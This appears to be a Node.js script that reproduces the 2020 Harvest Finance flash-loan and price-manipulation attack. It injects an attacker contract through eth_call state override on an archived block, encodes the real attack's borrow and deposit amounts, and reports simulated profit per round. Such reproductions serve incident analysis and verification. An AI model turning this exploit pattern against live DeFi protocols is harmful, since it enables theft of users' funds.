// SPDX-License-Identifier: MIT
// 无 Foundry 也能跑的攻击复现器
//
// 原理：eth_call 支持 stateOverride —— 直接把我们编译好的攻击合约"塞"进一个空地址，
//        然后在一个历史区块（默认 11,129,473，即攻击交易前一个块）上执行整个攻击。
//        这样不需要 forge/anvil，只要一个支持归档 + state override 的 RPC 就能复核结果。
//
// 用法：
//   node script/fork_replay.mjs --rpc <ARCHIVE_RPC> [--block 11129473] [--rounds 1,3] [--json out.json]
import { Rpc, sel, pad32, addr32, decUint, CHAIN, FORK_BLOCK, parseArgs } from "./lib/eth.mjs";
import { fileURLToPath } from "node:url";
import path from "node:path";
import fs from "node:fs/promises";

const ATTACKER = "0x00000000000000000000000000000000deadbeef";
const ATTACK_SIG = "attack((address,address,address,address,address,address,int128,int128),(uint256,uint256,uint256,uint256,uint256))";

export const PARAMS = {
  borrowTilt: 18_308_555.417594e6, // 从 USDT/WETH 对借出的 USDT（真实交易值）
  tiltAmount: 17_222_012.640506e6, // 真正砸进 yPool 的 USDT
  borrowWant: 50_000_000e6,        // 从 USDC/WETH 对借出的 USDC
  depositAmount: 49_977_468.555526e6, // 首轮存入 fUSDC 的 USDC
};

export function encodeAttack({ borrowTilt, tiltAmount, borrowWant, depositAmount, rounds }) {
  const cfg = [CHAIN.FUSDC, CHAIN.USDC, CHAIN.USDT, CHAIN.UNI_USDC_WETH, CHAIN.UNI_USDT_WETH, CHAIN.YPOOL]
    .map(addr32)
    .join("");
  return (
    sel(ATTACK_SIG) +
    cfg +
    pad32(1) + pad32(2) +
    [borrowTilt, tiltAmount, borrowWant, depositAmount, rounds].map((v) => pad32(BigInt(v))).join("")
  );
}

export function decodeReport(ret) {
  const body = ret.slice(2);
  const w = [];
  for (let i = 0; i < 4; i++) w.push(BigInt("0x" + body.slice(i * 64, (i + 1) * 64)));
  return { profit: w[0], shares: w[1], deposited: w[2], redeemed: w[3] };
}

/** 在历史状态上执行一次攻击，返回 Report（单位为 wei/最小单位） */
export async function replay(rpcUrl, opts) {
  opts = opts || {};
  const block = opts.block || FORK_BLOCK;
  const rounds = BigInt(opts.rounds || 1);
  const rpc = new Rpc(rpcUrl, { block: block, timeout: 120000 });
  const code = (await fs.readFile(opts.artifact || "artifacts/HarvestAttacker.runtime.hex", "utf8")).trim();
  const data = encodeAttack(Object.assign({}, PARAMS, opts.params || {}, { rounds: rounds }));
  const tx = { from: "0x0000000000000000000000000000000000001337", to: ATTACKER, data: data, gas: "0x2faf080" };
  const ret = await rpc.request("eth_call", [tx, "0x" + Number(block).toString(16), { [ATTACKER]: { code: code } }]);
  return decodeReport(ret);
}

export function fmt(n, decimals) {
  const d = decimals === undefined ? 6 : decimals;
  const s = n.toString().padStart(d + 1, "0");
  const i = s.slice(0, s.length - d);
  const f = s.slice(s.length - d);
  return i.replace(/\B(?=(\d{3})+(?!\d))/g, ",") + "." + f;
}

async function main() {
  const args = parseArgs(process.argv.slice(2));
  const rpcUrl = args.rpc || process.env.MAINNET_RPC_URL;
  if (!rpcUrl) {
    console.error("用法: node script/fork_replay.mjs --rpc <ARCHIVE_RPC> [--block 11129473] [--rounds 1,3]");
    process.exit(1);
  }
  const block = Number(args.block || FORK_BLOCK);
  const roundsList = String(args.rounds || "1,3").split(",").map((x) => Number(x.trim()));
  const results = [];
  console.log("=== Harvest Finance 闪电贷 + 预言机操纵 复现 ===");
  console.log("fork 区块: " + block + "（攻击交易 0x35f8...b0877 在 " + (block + 1) + "）");
  console.log("参数: 借 " + fmt(BigInt(PARAMS.borrowTilt)) + " USDT / " + fmt(BigInt(PARAMS.borrowWant)) + " USDC，"
    + "砸盘 " + fmt(BigInt(PARAMS.tiltAmount)) + " USDT，存入 " + fmt(BigInt(PARAMS.depositAmount)) + " USDC");
  console.log("");
  for (const r of roundsList) {
    const rep = await replay(rpcUrl, { block: block, rounds: r });
    results.push({ rounds: r, profit: rep.profit.toString(), shares: rep.shares.toString(), deposited: rep.deposited.toString(), redeemed: rep.redeemed.toString() });
    console.log("轮数 " + r + "  净利 " + fmt(rep.profit) + " USDC" + (r === 3 ? "（= 链上真实交易结构）" : ""));
    console.log("        末轮份额 " + fmt(rep.shares) + "  存入 " + fmt(rep.deposited) + "  赎回 " + fmt(rep.redeemed));
  }
  console.log("");
  console.log("链上真实交易第一轮：存入 49,977,468.555526 / 赎回 50,298,684.215219");
  console.log("链上真实交易第三轮：存入 50,574,381.356760 / 赎回 50,894,567.817318");
  if (args.json) {
    await fs.writeFile(args.json, JSON.stringify({ block, params: PARAMS, results }, null, 2), "utf8");
    console.log("已写入 " + args.json);
  }
}

const __isMain = (() => {
  try {
    const here = fileURLToPath(import.meta.url);
    const entry = process.argv[1] ? path.resolve(process.argv[1]) : "";
    return here === entry;
  } catch { return false; }
})();

if (__isMain) {
  main().catch((e) => { console.error(e.message || e); process.exit(1); });
}
